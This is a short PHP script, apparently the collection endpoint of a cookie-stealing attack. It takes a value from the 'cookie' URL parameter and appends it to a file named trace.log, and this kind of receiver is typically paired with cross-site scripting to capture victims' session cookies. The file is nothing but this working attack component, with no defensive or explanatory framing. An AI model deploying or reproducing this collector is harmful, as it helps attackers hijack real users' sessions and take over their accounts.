<?php
 $cookie_id = isset($_GET['cookie']) ? sprintf("Cookie ID received : %s\n",$_GET['cookie']) : "No cookie in GET parameter\n" ;
 $handle = fopen('trace.log', 'a+') ;
 fputs($handle, $cookie_id, 1024) ; ?>
